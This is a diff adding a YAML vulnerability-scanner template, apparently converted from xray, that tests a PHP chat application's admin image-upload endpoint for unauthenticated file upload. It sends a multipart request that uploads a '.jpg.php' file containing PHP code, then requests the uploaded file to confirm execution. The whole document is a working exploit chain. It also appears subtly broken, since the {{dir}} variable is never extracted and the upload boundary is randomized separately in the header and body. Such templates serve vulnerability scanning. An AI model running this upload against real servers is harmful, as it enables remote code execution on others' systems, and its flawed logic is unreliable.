@@ -1,0 +1,58 @@
+id: poc-yaml-php-chat-live-uploadimg-html-upload
+
+info:
+  name: poc-yaml-php-chat-live-uploadimg-html-upload
+  author: sharecast
+  severity: critical
+  tags: xray-converted,fileupload,ct-416577
+  reference:
+    - https://mp.weixin.qq.com/s/-LnDOjoqYMjtjoVV9l-EuA
+
+http:
+  - raw:
+      - |
+        GET /admin/event/uploadimg.html HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "editormd-image-file"
+  - raw:
+      - |
+        POST /admin/event/uploadimg.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_base(8)}}
+
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="editormd-image-file"; filename="{{rand_base(8)}}.jpg.php"
+        Content-Type: application/octet-stream
+        
+        <?php echo md5({{rand_int(1000, 9999)}});unlink(__FILE__);?>
+        ------WebKitFormBoundary{{rand_base(8)}}--
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ".php"
+  - raw:
+      - |
+        GET /{{dir}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
